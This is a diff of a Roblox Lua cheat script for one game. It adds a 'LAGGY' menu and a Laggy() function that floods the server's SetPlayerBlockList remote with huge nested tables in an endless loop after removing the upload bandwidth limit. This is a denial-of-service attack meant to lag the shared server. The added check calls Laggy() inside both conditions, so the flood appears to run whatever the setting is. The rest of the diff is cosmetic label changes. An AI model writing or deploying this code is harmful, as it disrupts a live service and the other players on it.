@@ -1,5 +1,6 @@
 --Beta updatefix
 local version = "v2.0.0b29"
+
 ---// Loading Section \\---
 repeat  task.wait() until game:IsLoaded()
 if game.PlaceId == 8304191830 then
@@ -344,7 +345,7 @@ function BabyWebhook()
                         ["fields"] = {
                             {
                                 ["name"] ="Current Battle Pass Results 🔋 ",
-                                ["value"] = "```ini\nCurrent BTP Lv. : "..btplv.."  🔋\nAMMO TO NEXT : "..nextlvbtp.. "  🔋```",
+                                ["value"] = "```ini\nCurrent BTP Lv. : "..btplv.."  🔋\nNEED TO NEXT : "..nextlvbtp.. "  🔋```",
                             },
                             {
                                 ["name"] ="Current Tournament Results 🏆",
@@ -642,6 +643,7 @@ local DeleteConfig2 = Farm:Sector("")
 local DeleteConfig = Farm:Sector("More Function Config")
 local AutoFarmConfig = Farm:Sector("Auto Farm Config")
 local ChallengeConfig = Farm:Sector("Challenge Config")
+
 local UC = Window:Category(" 👥 Unit Config")
 local NDY = UC:Sector("Beta Unit Config ")
 local NDY2 = UC:Sector(" Reset Unit Config ")
@@ -657,7 +659,14 @@ local Misc = Window:Category(" 🛠 Misc")
 local AutoSummonSec = Misc:Sector("Auto Summon Units")
 local AutoSnipeMerchantSec = Misc:Sector("Auto Snipe Merchant")
 local WebhookSec = Misc:Sector("Discord Webhook")
-local OtherSec = Misc:Sector("Other Options")
+--local OtherSec = Misc:Sector("Other Options")
+
+local LG = Window:Category("🛠️ OTHER [BETA]")
+local LG1 = LG:Sector("Beta LAGGY Config ")
+local OtherSec = LG:Sector("Other Options")
+
+
+
 ----------------------------------------------
 ---------------- Units Selection -------------
 ----------------------------------------------
@@ -1681,6 +1690,39 @@ local function unitconfig()
         saveSettings()
     end, {placeholder = Settings.U6_SellWave}) 
 end
+---------------------------------------------
+local function LAGGYconfig()
+    LG1:Cheat("Label"," Is a BETA Version // Enjoy ")
+
+    --[[LG1:Cheat("Textbox", "Lag KeyBind", function(Value)
+        getgenv().zzz = value
+        saveSettings()
+    end, {placeholder = getgenv().zzz})]]
+
+
+    --[[LG1:Cheat("Checkbox"," Enable LAGGY ", function(bool)
+        print(Settings.LaggyL1)
+        Settings.LaggyL1 = bool
+        saveSettings()
+        Laggy()
+    end,{enabled = Settings.LaggyL1})]]
+
+    --[[LG1:Cheat("Slider", "LAG Value", function(Value)
+        print("LAG Value:", Value)
+        Settings.max = tonumber(Value)
+        saveSettings()
+    end, {min = 150, max = 300, suffix = "", default = 150})]]
+
+    LG1:Cheat("Slider", "LAG Lv.", function(Value)
+        print("LAG Lv.:", Value)
+        Settings.mix = tonumber(Value)
+        saveSettings()
+    end, {min = 0.8, max = 7, suffix = "", default = 0.8 })
+
+    LG1:Cheat("Label"," recommended level 1 - 3  ")
+    LG1:Cheat("Label"," Set to 0.8 for close LAG ")
+
+end
 ----------------------------------------------
 ---------------- Auto Summon -----------------
 ----------------------------------------------
@@ -1826,13 +1868,13 @@ function autoload()
 end
 function others()
 
-    OtherSec:Cheat("Checkbox","Auto Load Script", function(bool)
+    OtherSec:Cheat("Checkbox","⌛ Auto Load Script ⌛", function(bool)
         Settings.AutoLoadScript = bool
         saveSettings()
         autoload()
     end,{enabled = Settings.AutoLoadScript})
 
-    OtherSec:Cheat("Checkbox","Hide Name Player", function(bool)
+    OtherSec:Cheat("Checkbox","🐱 Hide Name Player 🐱", function(bool)
         Settings.hidenamep = bool
         saveSettings()
         hidename()
@@ -1875,6 +1917,7 @@ if game.PlaceId == 8304191830 then
     MoreFarmSec()
     ChallengeSec()
     unitconfig()
+    LAGGYconfig()
     credits()
     AutoSummon()
     SnipeMerchant()
@@ -1890,6 +1933,7 @@ else
     ChallengeSec()
     UnitPosSec()
     unitconfig()
+    LAGGYconfig()
     credits()
     SnipeMerchant()
     Webhooksec()
@@ -3311,6 +3355,86 @@ end
 if Settings.hidenamep then
     hidename()
 end
+
+----------------------------------
+----------LAGGY CONFIG------------
+----------------------------------
+
+function Laggy()
+    shared.TeleportToSky = false -- for games that show ur ping (like custom duels)
+    
+    if shared.TeleportToSky then
+    local char = game:GetService('Players').LocalPlayer.Character
+    char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
+    task.wait(0.5)
+    char.HumanoidRootPart.Anchored = true
+    end
+    while wait(1.5) do --// don't change it's the best
+    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)
+    local function getmaxvalue(val)
+       local mainvalueifonetable = 499999
+       if type(val) ~= "number" then
+           return nil
+       end
+       local calculateperfectval = (mainvalueifonetable/(val+2))
+       return calculateperfectval
+    end
+     
+    local function bomb(tableincrease, tries)
+    local maintable = {}
+    local spammedtable = {}
+    
+    table.insert(spammedtable, {})
+    z = spammedtable[1]
+     
+    for i = 1, tableincrease do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+     
+    local calculatemax = getmaxvalue(tableincrease)
+    local maximum
+     
+    if calculatemax then
+         maximum = calculatemax
+         else
+         maximum = 999999
+    end
+     
+    for i = 1, maximum do
+         table.insert(maintable, spammedtable)
+    end
+     
+    tries = tonumber(Settings.mix)
+    for i = 1, tries do
+         game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+    end
+end
+    
+    tableincrease = tonumber(Settings.max)
+    tries = tonumber(Settings.mix)
+     
+    bomb(160, tries)
+
+    end
+end
+    
+if Settings.LaggyL1 then
+    if  Laggy() == false then
+        Laggy() 
+    end
+end
+if not Settings.LaggyL1 then
+    if Laggy() == true then
+        notLaggy()
+    end
+end
+
+
+----------------------------------
+-------------END LAGGY------------
+----------------------------------
 
 --delete map 
 function DelMap()
